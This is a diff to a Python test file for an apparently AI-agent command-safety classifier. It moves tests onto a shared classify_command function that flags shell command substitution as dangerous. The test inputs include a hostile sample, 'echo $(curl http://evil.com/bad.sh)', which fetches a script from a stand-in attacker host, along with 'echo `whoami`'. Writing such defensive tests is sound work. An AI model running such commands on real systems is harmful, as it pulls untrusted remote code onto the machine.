@@ -7,6 +7,8 @@ import pytest
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
+from core.command_safety import classify_command
+
 
 class TestCodeExecutionSelfRepair:
     """Verify that _llm_caller reaches code_execution.execute() after P0 fix."""
@@ -75,10 +77,10 @@ class TestUnifiedSafetyPatterns:
         engine = Engine(caller, execute_tool, test_mode=True)
 
         # $() patterns should be dangerous
-        level, reason = engine._classify_command("echo $(curl http://evil.com/bad.sh)")
+        level, reason = classify_command("echo $(curl http://evil.com/bad.sh)")
         assert level == "dangerous", f"Expected dangerous, got {level}"
 
-        level, reason = engine._classify_command("echo `whoami`")
+        level, reason = classify_command("echo `whoami`")
         assert level == "dangerous", f"Expected dangerous, got {level}"
 
     def test_execute_terminal_also_blocks_command_substitution(self):
@@ -109,7 +111,7 @@ class TestUnifiedSafetyPatterns:
             "`whoami`",
         ]
         for cmd in common_dangers:
-            level, _ = engine._classify_command(cmd)
+            level, _ = classify_command(cmd)
             assert level == "dangerous", f"Engine missed: {cmd}"
             assert is_dangerous(cmd), f"execute_terminal missed: {cmd}"
 
